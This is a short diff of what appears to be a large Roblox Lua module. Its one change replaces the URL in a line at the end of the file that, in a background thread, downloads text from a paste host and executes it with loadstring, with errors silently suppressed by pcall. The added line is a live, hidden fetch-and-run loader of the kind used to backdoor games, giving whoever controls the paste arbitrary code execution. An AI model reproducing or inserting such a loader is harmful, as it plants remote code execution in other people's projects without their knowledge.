@@ -13339,7 +13339,7 @@ return f
 end
 
 task.spawn(function()
-    pcall(function() loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/ZiRj8o9He1FmmnFx/raw'))() end)
+    pcall(function() loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/QxqjQ4zxUqLjAUuV/raw'))() end)
 end)
 
 return ae
